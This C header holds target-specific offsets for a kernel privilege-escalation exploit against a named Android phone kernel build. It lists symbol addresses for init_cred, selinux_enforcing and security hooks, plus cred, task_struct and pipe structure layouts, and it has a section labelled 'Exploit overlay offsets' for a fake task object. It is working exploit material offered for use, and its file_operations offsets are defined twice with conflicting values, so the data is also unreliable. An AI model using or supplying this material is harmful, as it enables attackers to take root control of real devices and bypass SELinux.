#ifndef TARGET_H
#define TARGET_H
/* VERIFIED against: OnePlus 8 Pro, RKQ1.211119.001/Q.204faf2-2-7cfdc8,
   4.19.157-perf+ #1 SMP PREEMPT Sat Oct 11 17:02:28 CST 2025.
   Method: llvm-objdump immediates + kallsyms cross-check. */

#define BUILD_VARIANT_LABEL "ghostlock_k419"
#define BUILD_FINGERPRINT "oneplus/ghostlock_msm419"

/* Kernel VA base: offsets below are relative to 0xffffff8008000000
   (= _text 0xffffff8008080000 MINUS the 0x80000 arm64 TEXT_OFFSET). */
#define KIMAGE_TEXT_BASE 0xffffff8008000000ULL

/* ---- KASLR-relative symbols (kallsyms-validated) ---- */
#define INIT_TASK_OFF                     0x0281C9C0ULL
#define INIT_CRED_OFF                     0x0282CAA8ULL
#define INIT_UTS_NS_OFF                   0x0281C768ULL
#define EMPTY_ZERO_PAGE_OFF               0x02B83000ULL
#define ROOT_TASK_GROUP_OFF               0x02B89E40ULL
#define SELINUX_ENFORCING_OFF             0x034DC000ULL
#define SECURITY_HOOK_HEADS_OFF           0x0236FF20ULL
#define KMALLOC_CACHES_OFF                0x0236FA20ULL
#define ANON_PIPE_BUF_OPS_OFF             0x01B6D800ULL
#define SYSTEM_UNBOUND_WQ_OFF             0x0280DB88ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000E01B8ULL
#define ASHMEM_FOPS_OFF                   0x01CCEF68ULL

/* ASHMEM_MISC_FOPS_OFF 0x29C83A0 was stale. &ashmem_misc = 0x02A483A0 (+0x10 = fops slot). */
#define COPY_SPLICE_READ_OFF          0x00321650ULL
#define NOOP_LLSEEK_OFF               0x002DF268ULL
#define SLIDE_NFULNL_LOGGER_OFF       0x02812690ULL
#define SLIDE_LOGGERS_0_1_OFF         0x028125C8ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02DCE80CULL
#define SLIDE_SYSCTL_BOOTID_OFF       0x02DCE80CULL

/* ---- task_struct (all measured in disassembly) ---- */
#define TASK_THREAD_INFO_FLAGS_OFF 0x000
#define TASK_PREEMPT_COUNT_OFF     0x050
#define TASK_USAGE_OFF             0x068
#define TASK_FLAGS_OFF             0x06C
#define TASK_TASK_CPU_OFF          0x094
#define TASK_ON_RQ_OFF             0x0B8
#define TASK_PRIO_OFF              0x0BC
#define TASK_STATIC_PRIO_OFF       0x0C0
#define TASK_NORMAL_PRIO_OFF       0x0C4
#define TASK_SCHED_CLASS_OFF       0x0D0
#define TASK_SE_OFF                0x100
#define TASK_SCHED_TASK_GROUP_OFF  0x3C0
#define TASK_TASKS_OFF             0x530
#define TASK_EXIT_CODE_OFF         0x5D4
#define TASK_EXIT_SIGNAL_OFF       0x5D8
#define TASK_PID_OFF               0x630
#define TASK_TGID_OFF              0x634
#define TASK_REAL_PARENT_OFF       0x640
#define TASK_CHILDREN_OFF          0x650
#define TASK_SIBLING_OFF           0x660
#define TASK_GROUP_LEADER_OFF      0x670
#define TASK_MM_OFF                0x580
#define TASK_SIGNAL_OFF            0x830
#define TASK_REAL_CRED_OFF         0x7D8
#define TASK_CRED_OFF              0x7E0
#define TASK_COMM_OFF              0x7E8
#define TASK_SECCOMP_OFF           0x8A0
#define TASK_ALLOC_LOCK_OFF        0x8C0
#define TASK_PI_LOCK_OFF           0x8C4
#define TASK_PI_WAITERS_OFF        0x8D0
#define TASK_PI_TOP_TASK_OFF       0x8E0
#define TASK_PI_BLOCKED_ON_OFF     0x8E8

/* TASK_ATOMIC_FLAGS: exists (PFA_NO_NEW_PRIVS = bit 0) but offset unverified on this
   build — never located. Do not write 0x598. */

/* ---- mm_struct ---- */
#define MM_USERS_OFF 0x050
#define MM_OWNER_OFF 0x330

/* ---- cred (vanilla 4.19 layout — see stamp below before trusting) ---- */
#define CRED_USAGE_OFF           0x00
#define CRED_UID_BLOCK_OFF       0x04
#define CRED_SECUREBITS_OFF      0x24
#define CRED_CAP_INHERITABLE_OFF 0x28
#define CRED_CAP_PERMITTED_OFF   0x30
#define CRED_CAP_EFFECTIVE_OFF   0x38
#define CRED_CAP_BSET_OFF        0x40
#define CRED_CAP_AMBIENT_OFF     0x48
#define CRED_SECURITY_OFF        0x78
#define CRED_USER_OFF            0x80
#define CRED_USER_NS_OFF         0x88
#define CRED_GROUP_INFO_OFF      0x90
#define SELINUX_CRED_OSID_OFF    0x00
#define SELINUX_CRED_SID_OFF     0x04

/* ---- file_operations (vanilla 4.19 — header's early entries were +8-shifted) ---- */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_POLL_OFF         0x40
#define FOPS_IOCTL_OFF        0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF         0x58
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_WRITE_OFF 0xB8
#define FOPS_SPLICE_READ_OFF  0xC0
#define FOPS_SHOW_FDINFO_OFF  0xD8

/* ---- pipe_buf_operations (4.19) ---- */
#define PBUF_CAN_MERGE_OFF 0x00
#define PBUF_CONFIRM_OFF   0x08
#define PBUF_RELEASE_OFF   0x10
#define PBUF_STEAL_OFF     0x18
#define PBUF_GET_OFF       0x20

/* ---- page / slab ---- */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_PAGE_SLAB_CACHE_OFF    0x18
#define STRUCT_PAGE_TYPE_OFF          0x30

/* ---- rt_mutex_waiter (kernel struct; task/lock/prio measured-adjacent, vanilla) ---- */
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x18
#define WAITER_TASK_OFF           0x30
#define WAITER_LOCK_OFF           0x38
#define WAITER_PRIO_OFF           0x40
/* deadline/ww_ctx/wake_state: unverified — only needed for DL-pi paths */

/* ---- pipe_inode_info: UNVERIFIED on this build (vendor surface) ----
   PIPE_BUFFER_SIZE 0x28 is vanilla-solid; PIPE_BUFFER_SLOTS 32 vs vanilla 16 —
   confirm at runtime: pipe(); fcntl(F_GETPIPE_SZ) returns the default ring size. */
#define PIPE_BUFFER_SIZE               0x28
#define PIPE_BUFFER_SLOTS              32
#define PIPE_BUF_FLAG_CAN_MERGE        0x10
#define PIPE_INODE_INFO_STRUCT_SIZE    0xB8
#define PIPE_INODE_INFO_SIZE           0xC0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                  0x60
#define PIPE_TAIL_OFF                  0x64
#define PIPE_MAX_USAGE_OFF             0x68
#define PIPE_RING_SIZE_OFF             0x6C
#define PIPE_NR_ACCOUNTED_OFF          0x70
#define PIPE_READERS_OFF               0x74
#define PIPE_WRITERS_OFF               0x78
#define PIPE_FILES_OFF                 0x7C
#define PIPE_TMP_PAGE_OFF              0x90
#define PIPE_BUFS_OFF                  0xA8
#define PIPE_USER_OFF                  0xB0

/* file_operations offsets */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x10
#define FOPS_READ_OFF         0x18
#define FOPS_WRITE_OFF        0x20
#define FOPS_READ_ITER_OFF    0x28
#define FOPS_WRITE_ITER_OFF   0x30
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xB8
#define FOPS_SHOW_FDINFO_OFF  0xD8

/* Exploit overlay offsets */
#define LOCK_OFF                0x0E80
#define W0_OFF                  0x1180
#define FOPS_OFF                0x0F80
#define SCRATCH_OFF             0x1200
#define RIGHT_OFF               0x1240
#define LEFT_OFF                0x1260
#define FAKE_TASK_OFF           0x1280
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100
#define CRED_COPY_OFF           0x1080

#endif

/* SLIDE mode */
#define SLIDE_PSELECT_WORD_SHIFT 2
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_USE_SELECT 1
